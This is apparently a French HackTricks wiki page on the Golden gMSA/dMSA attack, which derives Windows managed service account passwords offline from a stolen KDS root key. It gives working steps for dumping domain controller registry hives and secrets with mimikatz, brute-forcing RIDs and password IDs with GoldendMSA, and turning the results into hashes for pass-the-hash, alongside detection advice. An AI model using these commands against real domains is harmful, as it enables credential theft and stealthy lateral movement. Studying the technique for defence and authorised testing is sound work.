# Golden gMSA/dMSA Attack (Dérivation hors ligne des mots de passe des comptes de service gérés)

{{#include ../../banners/hacktricks-training.md}}

## Aperçu

Les comptes de service gérés Windows (MSA) sont des principes spéciaux conçus pour exécuter des services sans avoir besoin de gérer manuellement leurs mots de passe.
Il existe deux grandes variantes :

1. **gMSA** – compte de service géré de groupe – peut être utilisé sur plusieurs hôtes autorisés dans son attribut `msDS-GroupMSAMembership`.
2. **dMSA** – compte de service géré délégué – le successeur (en aperçu) du gMSA, reposant sur la même cryptographie mais permettant des scénarios de délégation plus granulaires.

Pour les deux variantes, le **mot de passe n'est pas stocké** sur chaque contrôleur de domaine (DC) comme un NT-hash classique. Au lieu de cela, chaque DC peut **dériver** le mot de passe actuel à la volée à partir de :

* La **clé racine KDS** à l'échelle de la forêt (`KRBTGT\KDS`) – secret nommé GUID généré aléatoirement, répliqué à chaque DC sous le conteneur `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …`.
* Le **SID** du compte cible.
* Un **ManagedPasswordID** (GUID) par compte trouvé dans l'attribut `msDS-ManagedPasswordId`.

La dérivation est : `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → blob de 240 octets finalement **encodé en base64** et stocké dans l'attribut `msDS-ManagedPassword`.
Aucun trafic Kerberos ou interaction avec le domaine n'est requis lors de l'utilisation normale du mot de passe – un hôte membre dérive le mot de passe localement tant qu'il connaît les trois entrées.

## Attaque Golden gMSA / Golden dMSA

Si un attaquant peut obtenir les trois entrées **hors ligne**, il peut calculer **des mots de passe valides actuels et futurs** pour **tout gMSA/dMSA dans la forêt** sans toucher à nouveau le DC, contournant :

* Les journaux de pré-authentification Kerberos / demande de ticket
* L'audit de lecture LDAP
* Les intervalles de changement de mot de passe (ils peuvent pré-calculer)

C'est analogue à un *Golden Ticket* pour les comptes de service.

### Prérequis

1. **Compromission au niveau de la forêt** d'**un DC** (ou Administrateur d'Entreprise). Un accès `SYSTEM` est suffisant.
2. Capacité à énumérer les comptes de service (lecture LDAP / brute-force RID).
3. Station de travail .NET ≥ 4.7.2 x64 pour exécuter [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) ou un code équivalent.

### Phase 1 – Extraire la clé racine KDS

Dump depuis n'importe quel DC (Volume Shadow Copy / hives SAM+SECURITY bruts ou secrets distants) :
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too
```
La chaîne base64 étiquetée `RootKey` (nom GUID) est requise dans les étapes suivantes.

### Phase 2 – Énumérer les objets gMSA/dMSA

Récupérer au moins `sAMAccountName`, `objectSid` et `msDS-ManagedPasswordId` :
```powershell
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) implémente des modes d'assistance :
```powershell
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
### Phase 3 – Deviner / Découvrir le ManagedPasswordID (lorsqu'il est manquant)

Certaines déploiements *suppriment* `msDS-ManagedPasswordId` des lectures protégées par ACL.  
Parce que le GUID est de 128 bits, le bruteforce naïf est infaisable, mais :

1. Les **32 premiers bits = temps d'époque Unix** de la création du compte (résolution en minutes).  
2. Suivis de 96 bits aléatoires.

Par conséquent, une **liste de mots étroite par compte** (± quelques heures) est réaliste.
```powershell
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
L'outil calcule les mots de passe candidats et compare leur blob base64 avec le véritable attribut `msDS-ManagedPassword` – la correspondance révèle le GUID correct.

### Phase 4 – Calcul et Conversion de Mot de Passe Hors Ligne

Une fois le ManagedPasswordID connu, le mot de passe valide est à une commande :
```powershell
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID>

# convert to NTLM / AES keys for pass-the-hash / pass-the-ticket
GoldendMSA.exe convert -d example.local -u svc_web$ -p <Base64Pwd>
```
Les hachages résultants peuvent être injectés avec **mimikatz** (`sekurlsa::pth`) ou **Rubeus** pour l'abus de Kerberos, permettant un **mouvement latéral** furtif et une **persistance**.

## Détection & Atténuation

* Restreindre les capacités de **sauvegarde DC et de lecture de la ruche de registre** aux administrateurs de niveau 0.
* Surveiller la création de **Mode de Récupération des Services d'Annuaire (DSRM)** ou de **Copie de Volume** sur les DC.
* Auditer les lectures / modifications de `CN=Master Root Keys,…` et des drapeaux `userAccountControl` des comptes de service.
* Détecter des **écritures de mots de passe base64** inhabituelles ou une réutilisation soudaine de mots de passe de service entre les hôtes.
* Envisager de convertir des gMSAs à privilèges élevés en **comptes de service classiques** avec des rotations aléatoires régulières lorsque l'isolement de niveau 0 n'est pas possible.

## Outils

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – implémentation de référence utilisée sur cette page.
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket utilisant des clés AES dérivées.

## Références

- [Golden dMSA – contournement d'authentification pour les Comptes de Service Gérés délégués](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [Dépôt GitHub Semperis/GoldenDMSA](https://github.com/Semperis/GoldenDMSA)
- [Improsec – attaque de confiance Golden gMSA](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)

{{#include ../../banners/hacktricks-training.md}}
